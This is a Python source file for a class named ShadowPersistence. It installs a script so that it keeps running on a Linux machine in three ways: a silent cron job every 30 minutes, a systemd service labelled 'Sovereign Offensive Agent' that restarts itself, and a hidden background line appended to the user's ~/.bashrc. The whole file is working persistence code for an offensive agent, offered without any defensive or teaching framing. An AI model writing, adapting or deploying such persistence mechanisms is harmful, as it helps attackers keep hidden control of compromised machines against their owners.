# -*- coding: utf-8 -*-
import os
import sys
import subprocess

class ShadowPersistence:
    def __init__(self, script_path):
        self.script_path = os.path.abspath(script_path)

    def linux_cron(self):
        cron_cmd = f"*/30 * * * * python3 {self.script_path} --silent > /dev/null 2>&1"
        try:
            current_cron = subprocess.check_output("crontab -l", shell=True).decode()
            if self.script_path not in current_cron:
                new_cron = current_cron + "\n" + cron_cmd
                p = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
                p.communicate(input=new_cron.encode())
                return True
        except:
            # If no crontab exists
            subprocess.run(f"(echo \"{cron_cmd}\") | crontab -", shell=True)
            return True
        return False

    def linux_systemd(self, service_name="sovereign"):
        service_content = f"""[Unit]
Description=Sovereign Offensive Agent
After=network.target

[Service]
ExecStart=python3 {self.script_path}
Restart=always
User={os.getlogin()}

[Install]
WantedBy=multi-user.target
"""
        service_path = f"/etc/systemd/system/{service_name}.service"
        try:
            with open(service_path, "w") as f:
                f.write(service_content)
            subprocess.run(["systemctl", "enable", service_name], check=True)
            subprocess.run(["systemctl", "start", service_name], check=True)
            return True
        except:
            return False

    def bashrc(self):
        bashrc_path = os.path.expanduser("~/.bashrc")
        cmd = f"\npython3 {self.script_path} --silent &\n"
        try:
            with open(bashrc_path, "r") as f:
                if self.script_path in f.read():
                    return False
            with open(bashrc_path, "a") as f:
                f.write(cmd)
            return True
        except:
            return False

    def check_persistence(self):
        # Implementation of persistence verification
        pass
